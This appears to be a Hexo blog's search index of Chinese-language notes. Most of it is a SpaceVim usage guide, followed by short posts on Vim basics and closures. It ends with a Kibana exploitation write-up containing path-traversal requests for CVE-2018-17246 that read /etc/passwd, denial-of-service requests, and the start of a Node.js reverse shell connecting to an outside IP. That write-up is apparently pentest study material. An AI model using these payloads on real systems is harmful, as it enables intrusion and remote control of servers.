href="#文件分屏操作" class="headerlink" title="文件分屏操作"></a>文件分屏操作</h4><p>如果只有一个可编辑窗口，则在该窗口中打开选择的文件，否则则需要指定窗口来打开文件：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>l</code> / <code>&lt;Enter&gt;</code></td><td>打开文件</td></tr><tr><td><code>sg</code></td><td>水平分屏打开文件</td></tr><tr><td><code>sv</code></td><td>垂直分屏打开文件</td></tr></tbody></table><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>文件操作相关的快捷键都是以 <code>SPC f</code> 为前缀的：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC f /</code></td><td>使用 <code>find</code> 或者 <code>fd</code> 命令查找文件，支持参数提示</td></tr><tr><td><code>SPC f b</code></td><td>跳至文件书签</td></tr><tr><td><code>SPC f c</code></td><td>copy current file to a different location(TODO)</td></tr><tr><td><code>SPC f C d</code></td><td>修改文件编码 unix -&gt; dos</td></tr><tr><td><code>SPC f C u</code></td><td>修改文件编码 dos -&gt; unix</td></tr><tr><td><code>SPC f D</code></td><td>删除文件以及 buffer，需要手动确认</td></tr><tr><td><code>SPC f E</code></td><td>open a file with elevated privileges (sudo edit)(TODO)</td></tr><tr><td><code>SPC f f</code></td><td>打开文件</td></tr><tr><td><code>SPC f F</code></td><td>打开光标下的文件</td></tr><tr><td><code>SPC f o</code></td><td>代开文件树，并定位到当前文件</td></tr><tr><td><code>SPC f R</code></td><td>rename the current file(TODO)</td></tr><tr><td><code>SPC f s</code> / <code>Ctrl-s</code></td><td>保存文件 (:w)</td></tr><tr><td><code>SPC f W</code></td><td>使用管理员模式保存</td></tr><tr><td><code>SPC f S</code></td><td>保存所有文件</td></tr><tr><td><code>SPC f r</code></td><td>打开文件历史</td></tr><tr><td><code>SPC f t</code></td><td>切换侧栏文件树</td></tr><tr><td><code>SPC f T</code></td><td>打开文件树侧栏</td></tr><tr><td><code>SPC f d</code></td><td>Windows 下显示/隐藏磁盘管理器</td></tr><tr><td><code>SPC f y</code></td><td>复制并显示当前文件的绝对路径</td></tr><tr><td><code>SPC f Y</code></td><td>复制并显示当前文件的远程路径</td></tr></tbody></table><h2 id="SpaceVim进阶"><a href="#SpaceVim进阶" class="headerlink" title="SpaceVim进阶"></a>SpaceVim进阶</h2><h3 id="工程管理"><a href="#工程管理" class="headerlink" title="工程管理"></a>工程管理</h3><p>当打开一个文件时，SpaceVim 会自动切换当前目录至包含该文件的项目根目录， 项目根目录的检测依据 <code>project_rooter_patterns</code> 这一选项，其默认值为：</p><pre><code class="toml">[options]    project_rooter_patterns = [&#39;.git/&#39;, &#39;_darcs/&#39;, &#39;.hg/&#39;, &#39;.bzr/&#39;, &#39;.svn/&#39;]</code></pre><p>项目管理器默认自动检测最外层的项目根目录，如果需要自动检测最内层的项目根目录， 可将选项 <code>project_rooter_outermost</code> 选项改为 <code>false</code>。</p><pre><code class="toml">[options]    project_rooter_patterns = [&#39;.git/&#39;, &#39;_darcs/&#39;, &#39;.hg/&#39;, &#39;.bzr/&#39;, &#39;.svn/&#39;]    project_rooter_outermost = false</code></pre><p>在自动检测项目根目录时，有时候我们需要忽略掉一些目录，可以表达式前面添加 <code>!</code>， 比如，忽略掉 <code>node_packages/</code> 文件夹：</p><pre><code class="toml">[options]    project_rooter_patterns = [&#39;.git/&#39;, &#39;_darcs/&#39;, &#39;.hg/&#39;, &#39;.bzr/&#39;, &#39;.svn/&#39;, &#39;!node_packages/&#39;]    project_rooter_outermost = false</code></pre><p>工程管理的命令以 <code>p</code> 开头：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC p &#39;</code></td><td>在当前工程的根目录打开 shell（需要 shell 模块）</td></tr></tbody></table><h4 id="在工程中搜索文件"><a href="#在工程中搜索文件" class="headerlink" title="在工程中搜索文件"></a>在工程中搜索文件</h4><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC p f</code></td><td>在当前工程中查找文件</td></tr><tr><td><code>SPC p /</code></td><td>在当前工程中搜索文本内容</td></tr><tr><td><code>SPC p k</code></td><td>关闭当前工程的所有缓冲区</td></tr><tr><td><code>SPC p p</code></td><td>显示所有工程</td></tr></tbody></table><p><code>SPC p p</code> 将会列出最近使用的项目清单，默认会显示最多 20 个， 这一数量可以使用 <code>projects_cache_num</code> 来修改。</p><p>为了可以夸 Vim 进程读取历史打开的项目信息，这一功能使用了缓存机制。 如果需要禁用这一缓存功能，可以将 <code>enable_projects_cache</code> 设为 <code>false</code>。</p><pre><code class="toml">[options]    enable_projects_cache = true    projects_cache_num = 20</code></pre><h4 id="自定义跳转文件"><a href="#自定义跳转文件" class="headerlink" title="自定义跳转文件"></a>自定义跳转文件</h4><p>若要实现自定义文件跳转功能，需要在项目根目录新建一个 <code>.project_alt.json</code> 文件， 并在此文件内指定文件跳转的规则。此后可以使用名<code>:A</code>跳转到相关文件， 同时可以加上参数指定跳转类型，比如 <code>:A doc</code>。与此同时，可以在命令后加入感叹号 <code>:A!</code>， 强制根据配置文件重新分析项目跳转文件结构。若未指定跳转类型，默认的类型为 <code>alternate</code>。</p><p>配置文件示例：</p><pre><code class="toml">&#123;  &quot;autoload/SpaceVim/layers/lang/*.vim&quot;: &#123;    &quot;doc&quot;: &quot;docs/layers/lang/&#123;&#125;.md&quot;,    &quot;test&quot;: &quot;test/layer/lang/&#123;&#125;.vader&quot;  &#125;&#125;</code></pre><h3 id="书签管理"><a href="#书签管理" class="headerlink" title="书签管理"></a>书签管理</h3><p>在浏览代码时，通常需要给指定位置添加标签，方便快速跳转，在 SpaceVim 中可以使用如下快捷键来管理标签。 这一功能需要载入 tools 模块：</p><pre><code class="toml">[layers]    name = &quot;tools&quot;</code></pre><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>m a</code></td><td>显示书签列表</td></tr><tr><td><code>m m</code></td><td>切换当前行标签状态</td></tr><tr><td><code>m n</code></td><td>跳至下一个书签</td></tr><tr><td><code>m p</code></td><td>跳至前一个书签</td></tr><tr><td><code>m i</code></td><td>给当前行标签添加说明</td></tr></tbody></table><p>正因为占用了以上几个快捷键，以下几个寄存器无法用来记忆当前位置了：<code>a</code>, <code>m</code>, <code>n</code>, <code>p</code>, <code>i</code>。 当然，也可以在启动函数里将 <code>&lt;Leader&gt; m</code> 映射为 <code>m</code> 键，如此便可使用 <code>&lt;Leader&gt; m a</code> 来代替 <code>m a</code>。</p><pre><code class="toml">function! myspacevim#before() abort    nnoremap &lt;silent&gt;&lt;Leader&gt;m mendfunction</code></pre><h3 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h3><p>通过内置的任务管理系统，可以快速集成外部命令工具，类似于 vscode 的任务管理系统， 在 SpaceVim 中，目前支持的任务配置文件包括两种：</p><ul><li><code>~/.SpaceVim.d/tasks.toml</code>：全局配置文件</li><li><code>.SpaceVim.d/tasks.toml</code>：项目局部配置文件</li></ul><p>全局配置中定义的任务，默认会被项目局部配置文件中定义的任务覆盖掉。</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC p t e</code></td><td>编辑任务配置文件</td></tr><tr><td><code>SPC p t r</code></td><td>选定任务并执行</td></tr><tr><td><code>SPC p t l</code></td><td>列出所有任务</td></tr></tbody></table><p><img src="https://user-images.githubusercontent.com/13142418/94822603-69d0c700-0435-11eb-95a7-b0b4fef91be5.png" alt="task_manager"></p><h4 id="自定义任务"><a href="#自定义任务" class="headerlink" title="自定义任务"></a>自定义任务</h4><p>以下为一个简单的任务配置示例，异步运行 <code>echo hello world</code>，并将结果打印至输出窗口。</p><pre><code class="toml">[my-task]    command = &#39;echo&#39;    args = [&#39;hello world&#39;]</code></pre><p><img src="https://user-images.githubusercontent.com/13142418/74582981-74049900-4ffd-11ea-9b38-7858042225b9.png" alt="task hello world"></p><p>对于不需要打印输出结果，后台运行的任务，可以设置 <code>isBackground</code> 为 <code>true</code>:</p><pre><code class="toml">[my-task]    command = &#39;echo&#39;    args = [&#39;hello world&#39;]    isBackground = true</code></pre><p>任务的配置，可以设置如下关键字：</p><ul><li><strong>command</strong>: 需要运行的命令。</li><li><strong>args</strong>: 传递给命令的参数，值为字符串数组</li><li><strong>options</strong>: 设置命令运行的一些选项，比如 <code>cwd</code>,<code>env</code> 或者 <code>shell</code>。</li><li><strong>isBackground</strong>: 可设定的值为 <code>true</code> 或者 <code>false</code>， 默认是 <code>false</code>， 设置是否需要后台运行任务</li><li><strong>description</strong>: 关于该任务的一段简短介绍</li></ul><p>当启动一个任务时，默认会关闭前一个任务，如果需要让任务一直保持后台运行， 可以将 <code>isBackground</code> 设为 <code>true</code>。</p><p>在编辑任务配置文件时，可以使用一些预设定的变量，以下列出目前已经支持的预设定变量：</p><ul><li><strong>${workspaceFolder}</strong>: - 当前项目的根目录；</li><li><strong>${workspaceFolderBasename}</strong>: - 当前项目根目录所在父目录的文件夹名称；</li><li><strong>${file}</strong>: - 当前文件的绝对路径；</li><li><strong>${relativeFile}</strong>: - 当前文件相对项目根目录的相对路径；</li><li><strong>${relativeFileDirname}</strong>: - 当前文件所在的文件夹相对项目根目录的相对路径；</li><li><strong>${fileBasename}</strong>: - 当前文件的文件名</li><li><strong>${fileBasenameNoExtension}</strong>: - 当前文件的文件名，不包括后缀名</li><li><strong>${fileDirname}</strong>: - 当前文件所在的目录的绝对路径</li><li><strong>${fileExtname}</strong>: - 当前文件的后缀名</li><li><strong>${lineNumber}</strong>: - 光标所在行号</li></ul><p>例如：假定目前正在编辑文件 <code>/home/your-username/your-project/folder/file.ext</code> ，光标位于第十行； 该文件所在的项目根目录为 <code>/home/your-username/your-project</code>，那么任务系统的预设定变量的值为：</p><ul><li><strong>${workspaceFolder}</strong>: - <code>/home/your-username/your-project/</code></li><li><strong>${workspaceFolderBasename}</strong>: - <code>your-project</code></li><li><strong>${file}</strong>: - <code>/home/your-username/your-project/folder/file.ext</code></li><li><strong>${relativeFile}</strong>: - <code>folder/file.ext</code></li><li><strong>${relativeFileDirname}</strong>: - <code>folder/</code></li><li><strong>${fileBasename}</strong>: - <code>file.ext</code></li><li><strong>${fileBasenameNoExtension}</strong>: - <code>file</code></li><li><strong>${fileDirname}</strong>: - <code>/home/your-username/your-project/folder/</code></li><li><strong>${fileExtname}</strong>: - <code>.ext</code></li><li><strong>${lineNumber}</strong>: - <code>10</code></li></ul><h4 id="任务自动识别"><a href="#任务自动识别" class="headerlink" title="任务自动识别"></a>任务自动识别</h4><p>SpaceVim 目前支持自动识别以下构建系统的任务：npm。 任务管理插件将自动读取并分析 npm 系统的文件<code>package.json</code>。 比如，克隆示例项目 <a href="https://github.com/spicydonuts/eslint-starter">eslint-starter</a>， 编辑其中的任意文件，然后按下快捷键<code>SPC p t r</code>，将会显示如下任务列表：</p><p><img src="https://user-images.githubusercontent.com/13142418/75089003-471d2c80-558f-11ea-8aea-cbf7417191d9.png" alt="task-auto-detection"></p><h4 id="任务提供源"><a href="#任务提供源" class="headerlink" title="任务提供源"></a>任务提供源</h4><p>任务提供源可以自动检测并新建任务。例如，一个任务提供源可以自动检测是否存在项目构建文件，比如：<code>package.json</code>， 如果存在则根据其内容创建 npm 的构建任务。</p><p>在 SpaceVim 里，如果需要新建任务提供源，需要使用启动函数，任务提供源是一个 Vim 函数，该函数返回一系列任务对象。</p><p>以下为一个简单的示例：</p><pre><code class="vimscript">function! s:make_tasks() abort    if filereadable(&#39;Makefile&#39;)        let subcmd = filter(readfile(&#39;Makefile&#39;, &#39;&#39;), &quot;v:val=~#&#39;^.PHONY&#39;&quot;)        if !empty(subcmd)            let commands = split(subcmd[0])[1:]            let conf = &#123;&#125;            for cmd in commands                call extend(conf, &#123;                            \ cmd : &#123;                            \ &#39;command&#39;: &#39;make&#39;,                            \ &#39;args&#39; : [cmd],                            \ &#39;isDetected&#39; : 1,                            \ &#39;detectedName&#39; : &#39;make:&#39;                            \ &#125;                            \ &#125;)            endfor            return conf        else            return &#123;&#125;        endif    else        return &#123;&#125;    endifendfunctioncall SpaceVim#plugins#tasks#reg_provider(funcref(&#39;s:make_tasks&#39;))</code></pre><p>将以上内容加入启动函数，在 SpceVim 仓库内按下 <code>SPC p t r</code> 快捷键，将会展示如下任务：</p><p><img src="https://user-images.githubusercontent.com/13142418/75105016-084cac80-564b-11ea-9fe6-75d86a0dbb9b.png" alt="task-make"></p><h3 id="ledit多光标编辑"><a href="#ledit多光标编辑" class="headerlink" title="ledit多光标编辑"></a>ledit多光标编辑</h3><p>SpaceVim 内置了 iedit 多光标模式，可快速进行多光标编辑。这一功能引入了两个新的模式：<code>iedit-Normal</code> 模式和 <code>iedit-Insert</code>。</p><p><code>iedit</code> 模式默认的颜色是 <code>red</code>/<code>green</code>，但它也基于当前的主题。</p><h4 id="Iedit-快捷键"><a href="#Iedit-快捷键" class="headerlink" title="Iedit 快捷键"></a>Iedit 快捷键</h4><p>模式转换:</p><p>前面提到 Iedit 引入了两个新的模式，在这两个新的模式以及 Vim 自身模式之间转换的快捷键如下：</p><table><thead><tr><th>快捷键</th><th>From</th><th>to</th></tr></thead><tbody><tr><td><code>SPC s e</code></td><td>Normal/Visual</td><td>iedit-Normal</td></tr><tr><td><code>&lt;Esc&gt;</code></td><td>iedit-Normal</td><td>Normal</td></tr></tbody></table><h5 id="在-iedit-Normal-模式中"><a href="#在-iedit-Normal-模式中" class="headerlink" title="在 iedit-Normal 模式中"></a>在 iedit-Normal 模式中</h5><p><code>iedit-Normal</code> 模式继承自 Vim 的 Normal 模式, 下面所列举的是 <code>iedit-Normal</code> 模式专属的快捷键。</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;Esc&gt;</code></td><td>切换回 Normal 模式</td></tr><tr><td><code>i</code></td><td>切换至 <code>iedit-Insert</code> 模式，类似于一般模式下的 <code>i</code></td></tr><tr><td><code>a</code></td><td>切换至 <code>iedit-Insert</code> 模式，类似于一般模式下的 <code>a</code></td></tr><tr><td><code>I</code></td><td>跳至当前 occurrence 并进入 <code>iedit-Insert</code> 模式，类似于一般模式下的 <code>I</code></td></tr><tr><td><code>A</code></td><td>跳至当前 occurrence 并进入 <code>iedit-Insert</code> 模式，类似于一般模式下的 <code>A</code></td></tr><tr><td><code>&lt;Left&gt;</code> / <code>h</code></td><td>左移光标，类似于一般模式下的 <code>h</code></td></tr><tr><td><code>&lt;Right&gt;</code> / <code>l</code></td><td>右移光标，类似于一般模式下的 <code>l</code></td></tr><tr><td><code>0</code> / <code>&lt;Home&gt;</code></td><td>跳至当前 occurrence 的开头，类似于一般模式下的 <code>0</code></td></tr><tr><td><code>$</code> / <code>&lt;End&gt;</code></td><td>跳至当前 occurrence 的结尾，类似于一般模式下的 <code>$</code></td></tr><tr><td><code>C</code></td><td>删除所有 occurrences 中从光标位置开始到 occurrences 结尾的字符，类似于一般模式下的 <code>C</code></td></tr><tr><td><code>D</code></td><td>删除所有 occurrences 类似于一般模式下的 <code>D</code></td></tr><tr><td><code>s</code></td><td>删除所有 occurrences 中光标下的字符并进入 <code>iedit-Insert</code> 模式，类似于一般模式下的 <code>s</code></td></tr><tr><td><code>S</code></td><td>删除所有 occurrences 并进入 <code>iedit-Insert</code> 模式，类似于一般模式下的 <code>S</code></td></tr><tr><td><code>x</code></td><td>删除所有 occurrences 中光标下的字符，类似于一般模式下的 <code>x</code></td></tr><tr><td><code>X</code></td><td>删除所有 occurrences 中光标前的字符，类似于一般模式下的 <code>X</code></td></tr><tr><td><code>gg</code></td><td>跳至第一个 occurrence，类似于一般模式下的 <code>gg</code></td></tr><tr><td><code>G</code></td><td>跳至最后一个 occurrence，类似于一般模式下的 <code>G</code></td></tr><tr><td><code>f&#123;char&#125;</code></td><td>向右移动光标至字符 <code>&#123;char&#125;</code> 首次出现的位置</td></tr><tr><td><code>n</code></td><td>跳至下一个 occurrence</td></tr><tr><td><code>N</code></td><td>跳至上一个 occurrence</td></tr><tr><td><code>p</code></td><td>替换所有 occurrences 为最后复制的文本</td></tr><tr><td><code>&lt;Tab&gt;</code></td><td>toggle current occurrence</td></tr></tbody></table><p><strong>In iedit-Insert mode:</strong></p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>Ctrl-g</code> / <code>&lt;Esc&gt;</code></td><td>回到 <code>iedit-Normal</code> 模式</td></tr><tr><td><code>Ctrl-b</code> / <code>&lt;Left&gt;</code></td><td>左移光标</td></tr><tr><td><code>Ctrl-f</code> / <code>&lt;Right&gt;</code></td><td>右移光标</td></tr><tr><td><code>Ctrl-a</code> / <code>&lt;Home&gt;</code></td><td>跳至当前 occurrence 的开头</td></tr><tr><td><code>Ctrl-e</code> / <code>&lt;End&gt;</code></td><td>跳至当前 occurrence 的结尾</td></tr><tr><td><code>Ctrl-w</code></td><td>删除光标前的词</td></tr><tr><td><code>Ctrl-k</code></td><td>删除光标后的词</td></tr><tr><td><code>Ctrl-u</code></td><td>删除光标前所有字符</td></tr><tr><td><code>Ctrl-h</code> / <code>&lt;BackSpace&gt;</code></td><td>删除光标前字符</td></tr><tr><td><code>&lt;Delete&gt;</code></td><td>删除光标后字符</td></tr></tbody></table><h3 id="高亮光标下变量"><a href="#高亮光标下变量" class="headerlink" title="高亮光标下变量"></a>高亮光标下变量</h3><p>SpaceVim 支持高亮当前光标下的变量，并且启动一个临时快捷键窗口， 提示可以通过快捷键进行修改高亮范围，以及下一步的操作。</p><p>目前支持的高亮范围包括：</p><ul><li>整个缓冲区（buffer）</li><li>当前函数内（function）</li><li>可见区域（visible area）</li></ul><p>使用快捷键 <code>SPC s h</code> 来高亮光标下的符号。</p><p>可使用如下快捷键在已高亮的变量间跳转：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>*</code></td><td>在当前缓冲区正向搜索光标下变量</td></tr><tr><td><code>#</code></td><td>在当前缓冲区逆向搜索光标下变量</td></tr><tr><td><code>SPC s e</code></td><td>启动 iedit 模式，编辑光标下变量</td></tr><tr><td><code>SPC s h</code></td><td>使用默认的的范围高亮光标下的变量</td></tr><tr><td><code>SPC s H</code></td><td>高亮当前缓冲区下所有的光标下变量</td></tr></tbody></table><p>在高亮临时快捷键模式下可使用如下快捷键:</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>e</code></td><td>启动 iedit 模式</td></tr><tr><td><code>n</code></td><td>跳至下一个匹配处</td></tr><tr><td><code>N</code> / <code>p</code></td><td>跳至上一个匹配处</td></tr><tr><td><code>b</code></td><td>在整个缓冲区内高亮该匹配</td></tr><tr><td><code>/</code></td><td>在整个工程内检索当前匹配</td></tr><tr><td><code>&lt;Tab&gt;</code></td><td>切换当前匹配高亮状态</td></tr><tr><td><code>r</code></td><td>切换匹配的范围</td></tr><tr><td><code>R</code></td><td>重置匹配的范围</td></tr><tr><td>Any other key</td><td>退出该临时快捷键模式</td></tr></tbody></table><h3 id="异步运行与交互编程"><a href="#异步运行与交互编程" class="headerlink" title="异步运行与交互编程"></a>异步运行与交互编程</h3><p>SpaceVim 提供了一个异步执行命令和交互式编程的插件， 在大多数语言模块中，已经为该语言定义了默认的执行命令，通常快捷键为 <code>SPC l r</code>。 如果需要添加额外的命令，可以使用启动函数。比如：添加使用 F5 按键异步编译当前项目。</p><pre><code>nnoremap &lt;silent&gt; &lt;F5&gt; :call SpaceVim#plugins#runner#open(&#39;make&#39;)</code></pre><p>目前，SpaceVim 支持如下特性：</p><ul><li>使用默认命令一键运行当前文件</li><li>使用系统文件管理器选择文件并执行</li><li>根据文件顶部标识，选择合适解析器</li><li>中断代码运行</li><li>底部窗口异步展示运行结果</li><li>设置默认的运行语言</li><li>选择指定语言来运行</li><li>支持交互式编程</li><li>运行选择的代码片段</li></ul><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>SpaceVim 通过默认通过 <a href="https://spacevim.org/cn/layers/checkers/">checkers</a> 模块来进行文件语法检查，默认在保存文件时进行错误检查。</p><p>错误管理导航键 (以 <code>e</code> 开头)：</p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>SPC t s</code></td><td>切换语法检查器</td></tr><tr><td><code>SPC e c</code></td><td>清除所有错误</td></tr><tr><td><code>SPC e h</code></td><td>describe a syntax checker</td></tr><tr><td><code>SPC e l</code></td><td>切换显示错误/警告列表</td></tr><tr><td><code>SPC e n</code></td><td>跳至下一错误</td></tr><tr><td><code>SPC e p</code></td><td>跳至上一个错误</td></tr><tr><td><code>SPC e v</code></td><td>verify syntax checker setup (useful to debug 3rd party tools configuration)</td></tr><tr><td><code>SPC e .</code></td><td>错误暂态（error transient state)</td></tr></tbody></table><p>下一个/上一个错误导航键和错误暂态(error transinet state) 可用于浏览语法检查器和位置列表缓冲区的错误， 甚至可检查 Vim 位置列表的所有错误。这包括下面的例子：在已被保存的位置列表缓冲区进行搜索。 默认提示符：</p><table><thead><tr><th>提示符</th><th>描述</th><th>自定义选项</th></tr></thead><tbody><tr><td><code>✖</code></td><td>Error</td><td><code>error_symbol</code></td></tr><tr><td><code>➤</code></td><td>warning</td><td><code>warning_symbol</code></td></tr><tr><td><code>ⓘ</code></td><td>Info</td><td><code>info_symbol</code></td></tr></tbody></table><p><strong>quickfix 列表移动：</strong></p><table><thead><tr><th>快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td><code>&lt;Leader&gt; q l</code></td><td>打开 quickfix 列表窗口</td></tr><tr><td><code>&lt;Leader&gt; q c</code></td><td>清除 quickfix 列表</td></tr><tr><td><code>&lt;Leader&gt; q n</code></td><td>跳到 quickfix 列表中下一个位置</td></tr><tr><td><code>&lt;Leader&gt; q p</code></td><td>跳到 quickfix 列表中上一个位置</td></tr></tbody></table><h3 id="格式规范"><a href="#格式规范" class="headerlink" title="格式规范"></a>格式规范</h3><p>SpaceVim 添加了 <a href="https://editorconfig.org/">EditorConfig</a> 支持，通过一个配置文件来为不同的文件格式设置对应的代码格式规范， 这一工具兼容多种文本编辑器和集成开发环境。</p><p>更多配置方式，可以阅读其官方文档：<a href="https://github.com/editorconfig/editorconfig-vim/blob/master/README.md">editorconfig-vim package’s documentation</a>.</p><h3 id="后台服务"><a href="#后台服务" class="headerlink" title="后台服务"></a>后台服务</h3><p>SpaceVim 在启动时启动了一个后台服务。无论何时，当你关闭了 Vim 窗口，该服务器就会被关闭。</p><p><strong>连接到 Vim 服务器</strong></p><p>如果你使用 Neovim, 你需要安装<a href="https://github.com/mhinz/neovim-remote">neovim-remote</a>，然后增加如下配置到你的 bashrc。</p><pre><code class="zsh">export PATH=$PATH:$HOME/.SpaceVim/bin</code></pre><p>使用命令 <code>svc</code> 在一个已存在的 Vim 服务器上打开文件，使用命令 <code>nsvc</code> 在一个已存在的 Neovim 服务器上打开文件。</p><p><img src="https://user-images.githubusercontent.com/13142418/32554968-7164fe9c-c4d6-11e7-95f7-f6a6ea75e05b.gif" alt="server-and-client"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VIM</title>
      <link href="Tools/VIM.html"/>
      <url>Tools/VIM.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="Vim基本概念"><a href="#Vim基本概念" class="headerlink" title="Vim基本概念"></a>Vim基本概念</h2><blockquote><p>  tab &gt; window &gt; buffer </p></blockquote><ul><li>标签页tab<ul><li>是窗口的集合，<code>:tabnew</code>创建</li></ul></li><li>窗口window<ul><li>提供buffer的可视视图，一个buffer对应多个window <code>:split/vsplit</code>创建</li></ul></li><li>缓冲区buffer<ul><li>buffer是vim和实际文件交互的通道，存在于内存中 <code>:buffers</code> 查看buffer列表</li></ul></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>program_concept</title>
      <link href="Coding/program-concept.html"/>
      <url>Coding/program-concept.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>闭包: 一个可以读取外部环境变量的函数。或者说能够读取其他函数内部变量的函数就是闭包。<br>    本质上，闭包就是函数内部和函数外部连接起来的一座桥梁，或者说一个通道。</p><p>因素:</p><ul><li>外层函数嵌套内层函数</li><li>内层函数使用外层函数的局部变量</li><li>将内层函数作为外层函数的返回<pre><code class="javascript">let a=1let b =function()&#123;console.log(a)&#125;</code></pre>作用：</li><li>可以读取函数内部的变量</li><li>让函数内部变量始终保存在内存中</li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kibana</title>
      <link href="Kali/Exploit/Kibana.html"/>
      <url>Kali/Exploit/Kibana.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>Kibana 是为 Elasticsearch设计的开源分析和可视化平台。用户可以使用 Kibana 来搜索、查看存储在 Elasticsearch 索引中的数据并与之交互，并且可以很容易实现高级的数据分析和可视化，以图标的形式展现出来。用户可以在大量数据之上创建条形图，折线图和散点图，或饼图和地图。</p><p>Kibana还提供了一个称为Canvas的演示工具，用户可以利用该工具来创建幻灯片平台，并且直接从Elasticsearch中获取实时数据。并且Elasticsearch，Logstash和Kibana的组合可以作为数据服务产品。Logstash向Elasticsearch提供输入流以进行存储和搜索，而Kibana则访问数据以进行可视化。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">nmap -Pn -T4 -sSUV -p 5601 192.168.79.207                                                                    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 14:55 CSTNmap scan report for 192.168.79.207Host is up (0.00017s latency).PORT     STATE  SERVICE  VERSION5601/tcp open   http     Elasticsearch Kibana 5.6.125601/udp closed esmagentNmap done: 1 IP address (1 host up) scanned in 11.54 seconds</code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="zsh">GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd   # 任意文件读取GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=es_6.0GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis= ../../../cli_plugin/index #拒绝服务漏洞</code></pre><h4 id="拒绝服务漏洞"><a href="#拒绝服务漏洞" class="headerlink" title="拒绝服务漏洞"></a>拒绝服务漏洞</h4><pre><code class="zsh"> curl &#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis= ../../../cli_plugin/index.js&#39;    curl &#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis= ../../../cli_plugin/cli.js&#39; curl &#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis= ../../../docs/cli.js&#39;</code></pre><h4 id="任意文件读取-CVE-2018-17246"><a href="#任意文件读取-CVE-2018-17246" class="headerlink" title="任意文件读取 CVE-2018-17246"></a>任意文件读取 CVE-2018-17246</h4><pre><code class="zsh">curl &#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd&#39;&#123;&quot;statusCode&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;An internal server error occurred&quot;&#125;%                       </code></pre><p>虽然响应码为500，但是服务器日志可以泄漏</p><p><img src="../images/kibana-1.png" alt="kibana-1"></p><p>通常情况下Kibana与其他的应用程序一起部署，如果应用程序可以上传或者写入Javascript文件的话，攻击者可以通过Nodejs创建一个Reverse Shell:<br>文件shell.js内容如下： 放到服务器中</p><pre><code class="javascript">(function()&#123;    var net = require(&quot;net&quot;),        cp = require(&quot;child_process&quot;),        sh = cp.spawn(&quot;/bin/sh&quot;, []);    var client = new net.Socket();    client.connect(7777, &quot;10.211.55.13&quot;, function()&#123;    //vps_ip:192.168.33.1  